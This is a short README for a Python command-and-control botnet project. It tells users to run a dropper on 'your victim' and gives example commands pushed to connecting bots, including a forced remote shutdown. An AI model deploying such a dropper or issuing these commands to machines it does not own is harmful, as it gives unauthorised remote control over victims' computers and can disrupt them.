# C-C-Botnet
A botnet in python, but it is bad!!

run dropper.py on your victim, port forwarding required, also it uses 127.0.0.1, so it is ONLY development

The autoexecute.command let's you choose a set of commands to run when a bot connects and prints the output, e.g.
whoami
{NEW LINE}
notepad hacked.txt
{NEW LINE}
shutdown /s /t 0
END OF EXAMPLE
